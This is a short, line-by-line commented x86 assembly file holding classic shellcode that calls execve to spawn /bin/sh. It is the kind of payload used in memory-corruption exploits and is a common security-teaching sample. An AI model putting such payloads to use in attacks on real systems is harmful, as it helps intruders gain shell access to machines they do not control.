# Some shellcode I found lying around somewhere.  It isn't mine.

.section .text
.globl _start
_start:
        # clear %eax
        xor %eax, %eax

        # assemble the path
        push %eax # null-terminate
        push $0x68732f2f # "//sh" (to make it 4 chars)
        push $0x6e69622f # "/bin"
        # put the address of the string in %ebx
        mov %esp,%ebx

        # assemble the arguments
        push %eax # null-terminate
        push %ebx # path to string
        # put the address of the arguments in %ecx
        mov %esp,%ecx

        # sign-extend %eax into %edx, thus zeroing the latter
        cltd

        # call execve
        mov $0xb, %al
        int $0x80
